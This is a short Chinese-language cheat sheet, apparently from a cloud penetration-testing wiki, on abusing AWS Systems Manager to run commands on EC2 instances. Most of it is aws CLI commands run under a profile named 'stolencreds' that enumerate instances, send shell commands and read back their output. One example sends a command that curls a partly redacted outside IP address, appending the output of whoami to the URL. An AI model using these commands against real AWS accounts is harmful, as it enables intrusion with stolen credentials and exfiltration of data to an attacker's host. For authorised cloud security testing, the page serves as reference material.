# AWS - 服务 - SSM (Systems Manager)

## 命令执行 (Command execution)

:warning: 当卸载 SSM Agent 时，ssm-user 帐户不会从系统中移除。

默认情况下，SSM Agent 预装在以下亚马逊机器镜像 (AMIs) 上：

* 2016 年 11 月或之后发布的 Windows Server 2008-2012 R2 AMIs
* Windows Server 2016 和 2019
* Amazon Linux
* Amazon Linux 2
* Ubuntu Server 16.04
* Ubuntu Server 18.04
* Amazon ECS-Optimized

```powershell
$ aws ssm describe-instance-information --profile stolencreds --region eu-west-1  
$ aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile stolencreds
$ aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}" --profile stolencreds

例如:
$ aws ssm send-command --instance-ids "i-05b████████adaa" --document-name "AWS-RunShellScript" --comment "whoami" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1
```

## 参考资料 (References)

* [What is AWS Systems Manager? - AWS](https://docs.aws.amazon.com/systems-manager/latest/userguide/what-is-systems-manager.html)
